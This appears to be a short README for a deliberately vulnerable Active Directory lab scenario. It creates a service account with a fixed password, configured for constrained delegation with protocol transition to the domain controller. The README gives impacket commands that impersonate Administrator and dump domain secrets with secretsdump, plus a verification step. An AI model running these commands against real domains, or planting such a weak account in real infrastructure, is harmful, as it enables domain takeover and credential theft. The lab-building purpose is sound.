# constrained-deleg-any

Creates `scn-cdany-svc` (password `Aa1234567890!`) with SPN `HTTP/scn-cdany.<domain>`, `TrustedToAuthForDelegation` (protocol transition, "use any authentication protocol") and `msDS-AllowedToDelegateTo` = `CIFS/<dc fqdn>`, `CIFS/<dc hostname>`.

Attack:

    getST.py -spn 'CIFS/<dc fqdn>' -impersonate Administrator <domain>/scn-cdany-svc:'Aa1234567890!' -dc-ip <dc ip>
    KRB5CCNAME=Administrator@CIFS_<dc fqdn>@<DOMAIN>.ccache secretsdump.py -k -no-pass <dc fqdn>

How to verify:

    findDelegation.py <domain>/<user>:'Aa1234567890!' -dc-ip <dc ip>   # scn-cdany-svc  Constrained w/ Protocol Transition

Disable deletes the account (SPN and delegation go with it).
